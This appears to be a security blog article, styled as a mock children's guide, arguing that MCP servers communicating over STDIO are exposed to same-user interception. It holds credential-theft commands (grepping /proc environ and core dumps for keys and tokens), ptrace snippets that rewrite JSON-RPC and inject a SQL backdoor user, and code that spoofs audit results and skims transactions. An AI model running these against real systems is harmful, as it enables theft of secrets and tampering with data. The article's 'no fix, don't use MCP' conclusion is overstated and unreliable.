# The Complete STDIO Attack Chain: A Children's Guide to MCP Destruction

## "Remember Children..." 🧒

> "The key insight is that STDIO pipes are just file descriptors under the hood, making them fully interceptable with the right privileges and tools."

This is the bedtime story that should keep every CISO awake at night.

## The Complete Attack Chain

### Step 1: Process Discovery
```bash
# Find MCP server process
ps aux | grep db-server.py

# Output:
billy  12345  0.0  0.1  123456  7890 ?  S  09:00  0:00 python db-server.py --oracle-pass=Pr0d123!

# 🎯 JACKPOT: Password visible in process list!
```

### Step 2: Initial Reconnaissance
```bash
# Attach and monitor STDIO
strace -p 12345 -e trace=read,write -o mcp_traffic.log

# What we see:
read(0, "{\"method\":\"query\",\"sql\":\"SELECT * FROM credit_cards\"}", 1024) = 55
write(1, "{\"results\":[{\"number\":\"4111111111111111\",\"cvv\":\"123\"}]}", 1024) = 58

# 💳 Credit card data flowing through STDIO!
```

### Step 3: Real-Time Interception
```bash
# Attach with modification capability
gdb -p 12345

(gdb) # Now we own the process
(gdb) # Can modify ANY data in flight
(gdb) # Can inject ANY commands
(gdb) # Can steal ANY credentials
```

## The Three Pillars of STDIO Destruction

### 1. Credential Extraction 🔑

#### Process Arguments
```bash
# Visible to EVERYONE on the system
ps aux | grep mcp
billy 12345 mcp-oracle --user=system --pass=0r4cl3! --sid=PROD

# Environment Variables  
cat /proc/12345/environ | tr '\0' '\n' | grep -i key
OPENAI_API_KEY=sk-prod-1234567890
AWS_SECRET_KEY=abcdef123456
GITHUB_TOKEN=ghp_supersecret
```

#### Memory Dumps
```bash
# Dump process memory
gcore 12345

# Extract credentials from core dump
strings core.12345 | grep -i "password\|key\|token"
"api_key": "sk-production-key-123"
"db_password": "SuperSecret123!"
"oauth_token": "ya29.realtoken"
```

### 2. Data Manipulation 📝

#### Modify In-Flight Messages
```c
// Using ptrace to modify JSON-RPC
if (syscall == SYS_write && fd == 1) {
    char* response = (char*)buffer;
    
    // User queries: "SELECT salary FROM employees WHERE name='CEO'"
    // Real result: "$10,000,000"
    // We change to: "$100,000"
    
    response = str_replace(response, "10000000", "100000");
}
```

#### Inject Malicious Calls
```c
// Inject our own database commands
char* evil_query = "{\"method\":\"query\",\"sql\":\"CREATE USER backdoor IDENTIFIED BY hacked; GRANT DBA TO backdoor;\"}";
ptrace(PTRACE_POKEDATA, pid, buffer_addr, evil_query);
```

#### Spoof Database Responses
```python
# Make database lie to AI
def spoof_response(original):
    if "security_audit" in original:
        # Hide our tracks
        return '{"result": "No security violations found"}'
    return original
```

### 3. Complete Communication Control 🎭

#### What Flows Through STDIO
1. **Database Credentials** - Connection strings, passwords
2. **API Keys** - OpenAI, AWS, GitHub, etc.
3. **AI Prompts** - User intentions and queries  
4. **Query Results** - Sensitive business data
5. **Tool Invocations** - System commands, file operations

#### Attack Capabilities
- **See Everything**: All data in plaintext
- **Modify Anything**: Change requests/responses
- **Inject Whatever**: Add malicious operations
- **Block Selectively**: Prevent security alerts

## The Children's Lesson Applied

### Why STDIO is "Secure" (It's Not)
```
Developers think:
"It's local communication, not network"
"It's between trusted processes"
"It's isolated from external access"

Reality:
- Any same-user process can intercept
- File descriptors are just numbers
- ptrace/gdb are "features" not bugs
```

### The Brutal Math
```
MCP using STDIO + Same user access = GAME OVER

Because:
- STDIO pipes = File descriptors
- File descriptors = Numbers (0, 1, 2, etc.)
- Numbers = Can be changed
- Changed = Attacker controls everything
```

## Real-World Exploitation

### The Banking Scenario
```bash
# 1. Junior developer Billy debugs production issue
$ sudo gdb -p $(pgrep mcp-oracle)

# 2. Billy doesn't realize he's created a log
$ cat ~/.gdb_history
attach 12345
x/100s $rsp
detach

# 3. Attacker finds Billy's command history
# 4. Repeats GDB commands
# 5. Extracts all banking credentials
# 6. BANK LOSES EVERYTHING
```

### The Perfect Crime
```python
# Intercept and modify specific transactions
def process_transaction(data):
    transaction = json.loads(data)
    
    if transaction["amount"] > 1000000:
        # Skim 0.01% to attacker account
        skim = transaction["amount"] * 0.0001
        transaction["amount"] -= skim
        
        # Hidden transaction
        send_to_attacker_account(skim)
    
    return json.dumps(transaction)
```

## Why This Can't Be Fixed

### Fundamental Architecture Flaws
1. **STDIO is 50 years old** - Designed before security
2. **Same user = trusted** - 1970s assumption
3. **Everything is a file** - Including your secrets
4. **Debugging is necessary** - Can't disable ptrace

### The Inescapable Truth
```
If Process A and Process B:
- Run as same user
- Communicate via STDIO
- Process in plaintext

Then ANY Process C (same user) can:
- See everything
- Modify anything
- Control completely
```

## The Children's Takeaway

🎓 **Today's Lesson**: 
"STDIO pipes are just file descriptors, and file descriptors are just numbers, and numbers can be changed by anyone with the same user ID, which means your 'secure' AI-to-database communication is actually completely exposed to any process running as the same user."

**Translation**: MCP's security model is fundamentally broken at the architectural level.

**For Parents (CISOs)**: Your million-dollar AI infrastructure can be completely compromised by techniques from 1970s UNIX. There is no patch. There is no fix. There is only "don't use MCP."
